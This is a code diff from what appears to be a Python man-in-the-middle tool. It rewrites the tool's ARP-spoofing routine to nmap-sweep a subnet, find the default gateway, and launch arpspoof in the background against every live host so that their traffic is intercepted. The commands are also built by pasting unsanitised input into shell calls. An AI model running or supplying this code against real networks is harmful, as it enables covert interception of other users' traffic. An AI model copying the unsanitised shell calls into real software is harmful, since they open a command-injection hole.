@@ -280,19 +280,17 @@ if not(results.rule):
      if("dns" in permit):
          os.popen("iptables -I FORWARD -p udp --dport 53 "+timeout+" -j ACCEPT")
          
-if not(results.spoof=="none"): #Works slowly(256 pings) but once has started all arpspoof jobs it's done
-      i=0
-      dgip=results.spoof 
-      print "Started spoofing for:\n"
-      ip=dgip.split(".")
-      netip=str(ip[0])+"."+str(ip[1])+"."+str(ip[2])+"."
-      while(i<255):
-        i=i+1
-        ip=netip+str(i)
-        pong=os.popen("ping -c 1 "+ip).read()
-        if("bytes from" in pong):
-          os.popen("nohup arpspoof -t "+ip+" "+dgip+" >/dev/null 2>&1 &")
-          print ip+"\n"
+if not(results.spoof=="none"): 
+        ipnet=results.spoof  # Example : 192.168.1.0/24 .
+        iplist=os.popen("nmap -sP "+ipnet+" | grep 'Nmap scan' | awk '{ print $5; }'").read()
+        iplist=iplist.split()
+        dgip=os.popen("ip route show | grep 'default' | awk '{print $3}' ").read()
+        dgip=dgip.split()[0]
+        print "Spoofing "+dgip+"\n\n"
+        for ip in iplist:
+                print ip
+                os.popen("nohup arpspoof -t "+ip+" "+dgip+" >/dev/null 2>&1 &")
+
 
 
 if(results.killmitm):
